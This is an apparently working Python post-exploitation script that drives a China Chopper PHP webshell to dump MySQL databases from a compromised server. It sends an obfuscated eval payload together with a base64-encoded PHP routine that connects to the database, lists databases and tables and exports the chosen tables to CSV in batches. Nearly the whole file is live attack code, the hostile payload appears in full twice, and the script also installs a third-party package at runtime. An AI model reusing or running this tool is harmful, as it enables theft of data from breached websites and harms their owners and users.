'''
#header文件格式要求
eg.

Cache-Control:no-cache
Referer:http://www.abc.com
Content-Type:application/x-www-form-urlencoded
User-Agent:Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Connection:keey-alive
Accept:*/*

#post数据文件格式要求,eg.


chopperPassValue=$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval($xx($yy[z0]));
z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskbT1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOyRoc3Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSk6JF9QT1NUWyJ6MSJdOyR1c3I9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejIiXSk6JF9QT1NUWyJ6MiJdOyRwd2Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejMiXSk6JF9QT1NUWyJ6MyJdOyRkYm49JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejQiXSk6JF9QT1NUWyJ6NCJdOyRzcWw9YmFzZTY0X2RlY29kZSgkX1BPU1RbIno1Il0pOyRUPUBteXNxbF9jb25uZWN0KCRoc3QsJHVzciwkcHdkKTtAbXlzcWxfcXVlcnkoIlNFVCBOQU1FUyB1dGY4Iik7QG15c3FsX3NlbGVjdF9kYigkZGJuKTskcT1AbXlzcWxfcXVlcnkoJHNxbCk7JGk9MDt3aGlsZSgkY29sPUBteXNxbF9maWVsZF9uYW1lKCRxLCRpKSl7ZWNobygkY29sLiJcdHxcdCIpOyRpKys7fWVjaG8oIlxyXG4iKTt3aGlsZSgkcnM9QG15c3FsX2ZldGNoX3JvdygkcSkpe2ZvcigkYz0wOyRjPCRpOyRjKyspe2VjaG8odHJpbSgkcnNbJGNdKSk7ZWNobygiXHR8XHQiKTt9ZWNobygiXHJcbiIpO31AbXlzcWxfY2xvc2UoJFQpOztlY2hvKCJ8PC0iKTtkaWUoKTs=
z1=this is db host
z2=this is db user
z3=this is db pass
z4=this is db name
z5=this is query param(提供的post文件里这行可以没有)
'''


global count, everyQueryCount
count = 0
everyQueryCount = 0


def HandlePostData():
    import re
    import base64
    global postData, everyQueryCount, count
    start = everyQueryCount * count + 1
    query = "SELECT * FROM `%s` ORDER BY 1 DESC LIMIT %d,%d" % (tableName, start, start + everyQueryCount - 1)
    # print(query)
    postData["z5"] = base64.b64encode(query.encode(encoding="utf-8"))


def query(queryString):
    global mode
    global httpHeaderContent
    global dbHost, dbUser, dbPass, dbName, postData, url, chopperPass
    if mode == 1:
        postData['z0'] = "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskbT1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOyRoc3Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSk6JF9QT1NUWyJ6MSJdOyR1c3I9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejIiXSk6JF9QT1NUWyJ6MiJdOyRwd2Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejMiXSk6JF9QT1NUWyJ6MyJdOyRkYm49JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejQiXSk6JF9QT1NUWyJ6NCJdOyRzcWw9YmFzZTY0X2RlY29kZSgkX1BPU1RbIno1Il0pOyRUPUBteXNxbF9jb25uZWN0KCRoc3QsJHVzciwkcHdkKTtAbXlzcWxfcXVlcnkoIlNFVCBOQU1FUyB1dGY4Iik7QG15c3FsX3NlbGVjdF9kYigkZGJuKTskcT1AbXlzcWxfcXVlcnkoJHNxbCk7JGk9MDt3aGlsZSgkY29sPUBteXNxbF9maWVsZF9uYW1lKCRxLCRpKSl7ZWNobygkY29sLiJcdHxcdCIpOyRpKys7fWVjaG8oIlxyXG4iKTt3aGlsZSgkcnM9QG15c3FsX2ZldGNoX3JvdygkcSkpe2ZvcigkYz0wOyRjPCRpOyRjKyspe2VjaG8odHJpbSgkcnNbJGNdKSk7ZWNobygiXHR8XHQiKTt9ZWNobygiXHJcbiIpO31AbXlzcWxfY2xvc2UoJFQpOztlY2hvKCJ8PC0iKTtkaWUoKTs="
        postData['z1'] = dbHost
        postData['z2'] = dbUser
        postData['z3'] = dbPass
        postData['z4'] = dbName
        postData[
            chopperPass] = "$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval($xx($yy[z0]));"

        from exp10it import get_http_domain_from_url
        from exp10it import get_random_header
        httpHeaderContent = get_random_header()
        httpHeaderContent['Referer'] = get_http_domain_from_url(url)
        httpHeaderContent['Content-Type'] = "application/x-www-form-urlencoded"

    else:
        postData["z4"] = dbName

    import requests
    import base64
    postData["z5"] = base64.b64encode(queryString.encode(encoding="utf-8"))
    result = requests.post(url, data=postData, headers=httpHeaderContent)
    html = result.content.decode("utf8")
    return html[3:-3]


def main():
    import os
    os.system("pip3 install exp10it -U")
    import requests
    from exp10it import get_input_intime
    import re
    global httpHeaderContent, postData, headerFile, postDataFile, everyQueryCount, count, dbHost, dbUser, dbPass, dbName, tableName, url, chopperPass, mode
    # count是第几次查询
    httpHeaderContent = {}
    postData = {}
    url = input("please input webshell url:")
    chopperPass = input("please input your webshell pass:")
    print("1.不抓包模式\nor\n2.抓包后模式?\n不抓包模式目前只测试过php+mysql组合 抓包后模式功能更强大\
[但是需要用charles做sock5代理,proxfier设置chopper的代理为charles提供的对应的代理地址,用charles抓到chopper\
的包后按照代码中要求的格式保存到下面要提供的文件中]\n请选择对应模式序号,默认选择1")
    mode = get_input_intime(1)
    if str(mode) == "1":
        dbHost = input("please input db host:\n")
        dbUser = input("please inpuot db user:\n")
        dbPass = input("please input db pass:\n")
        dbName = input("please input db name:\n")
    else:
        headerFile = input("please input your post header file abspath,header头要求如代码中的示例格式:\n")
        postDataFile = input("please input your post data file abspath,post数据要求如代码中的示例格式:\n")
        with open(headerFile, "r+") as f:
            for eachLine in f:
                eachLine = re.sub("\s$", "", eachLine)
                eachHeaderParam = eachLine.split(":")[0]
                eachHeaderParamValue = eachLine[len(eachHeaderParam) + 1:]
                httpHeaderContent[eachHeaderParam] = eachHeaderParamValue

        with open(postDataFile, "r+") as f:
            for eachLine in f:
                eachLine = re.sub("\s$", "", eachLine)
                eachPostParam = eachLine.split("=")[0]
                eachPostParamValue = eachLine[len(eachPostParam) + 1:]
                postData[eachPostParam] = eachPostParamValue

    while 1:
        if mode == 1:
            pass
        else:
            dbName = postData['z4']
        result = query("show databases")
        print("you are accessed on below database:\n")
        pureData = result[len(result.split("\r\n")[0] + "\r\n"):]
        list = re.findall("([^\s\|]+)", pureData)
        for eachDbname in list:
            print(eachDbname)
        dbName = input("\nplease input db name you want to dump data from:\n")
        result = query("show tables")
        print("\nthe db you choosed has below tables:\n")

        pureData = result[len(result.split("\r\n")[0] + "\r\n"):]
        list = re.findall("([^\s\|]+)", pureData)
        for eachTablename in list:
            result = query("select count(*) from %s" % eachTablename)
            entryNum = re.search("(\d+)", result).group(1)
            print(eachTablename + "[%d]" % int(entryNum))
        tableName = input("\nplease input table name you want to dump:\n")

        totalDataCount = int(input("please input how much data there are[想dump多少条数据?]:\n"))
        everyQueryCount = int(
            input("please input how much data do you want to query each time[每次要查询多少条数据?]:\n"))
        # 下面是一共要查询的次数
        totalQueryCount = totalDataCount // everyQueryCount

        # 下面是每次查询完后对查询参数的改变函数
        HandlePostData()

        for i in range(totalQueryCount):
            result = requests.post(url, data=postData, headers=httpHeaderContent)
            html = result.content.decode("utf8")[3:-3]
            print(html)
            # 菜刀中的数据是\r\n换行,如果是用大马中的post数据则有可能是\n换行符,菜刀版本不一样也有可能会是\n换行符,这里
            # 的返回的sql数据中是\r\n换行符,不同情况时这里要修改
            firstLine = html.split("\r\n")[0]
            # 第一行中以->|开头,最后一行为|<-
            firstLine2write = firstLine[3:]
            data2write = html[len(firstLine + "\r\n"):-3]
            with open("%s.csv" % tableName, "a+") as f:
                if count == 0:
                    f.write(firstLine2write + "\r\n")
                # 这里每次查询2000条数据,要在post文件的数据中将对应数据修改成每次要查询的条数
                count += 1
                num = count * everyQueryCount
                print("查询了%d条数据" % num)
                f.write("下面是到%d条数据:\r\n" % num)
                f.write(data2write)


if __name__ == '__main__':
    main()
